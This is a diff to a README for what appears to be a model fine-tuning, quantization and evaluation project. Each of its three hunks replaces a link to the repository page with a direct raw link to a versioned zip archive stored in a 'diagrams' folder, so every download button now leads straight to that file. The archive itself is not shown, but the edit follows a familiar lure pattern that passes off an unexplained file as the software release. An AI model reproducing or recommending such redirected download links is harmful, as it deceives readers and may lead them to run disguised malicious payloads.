@@ -1,6 +1,6 @@
 # 🤖 finetuning-quantize-evaluate - Fine-tune and test models with ease
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate/raw/refs/heads/main/diagrams/evaluate-quantize-finetuning-v3.4.zip)
 
 ## 📌 What this is
 
@@ -30,7 +30,7 @@ For small tests, a basic laptop can work. For larger models, a stronger machine 
 
 Visit this page to download:
 
-[https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate)
+[https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate/raw/refs/heads/main/diagrams/evaluate-quantize-finetuning-v3.4.zip](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate/raw/refs/heads/main/diagrams/evaluate-quantize-finetuning-v3.4.zip)
 
 After the page opens:
 
@@ -233,7 +233,7 @@ This project includes work around:
 
 ## 🔗 Download again
 
-[![Download](https://img.shields.io/badge/Download-Open%20Page-grey?style=for-the-badge)](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate)
+[![Download](https://img.shields.io/badge/Download-Open%20Page-grey?style=for-the-badge)](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate/raw/refs/heads/main/diagrams/evaluate-quantize-finetuning-v3.4.zip)
 
 ## 🪟 Windows setup path
 
